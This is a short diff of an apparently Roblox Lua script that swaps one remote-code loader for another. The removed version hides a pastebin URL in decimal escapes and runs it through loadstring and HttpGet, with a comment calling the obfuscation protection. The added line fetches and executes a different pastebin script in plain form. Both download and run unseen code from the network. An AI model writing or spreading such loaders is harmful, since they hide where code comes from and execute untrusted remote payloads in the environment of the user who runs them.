@@ -1,17 +1,1 @@
-local _0 = { 
-    a = game, 
-    b = game.HttpGet, 
-    c = loadstring 
-}
-
-local _1 = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\71\121\88\114\115\52\68\98"
-
-local function _2(s)
-    local r = {}
-    for i = 1, #s do
-        r[i] = string.char(s:byte(i))
-    end
-    return table.concat(r)
-end
-
-_0.c(_0.b(_0.a, _2(_1)))() --Obfuscated to Protect the script, code, and it's source, thank you for understanding.
+loadstring(game:HttpGet("https://pastebin.com/raw/aXVqQJQ8"))()
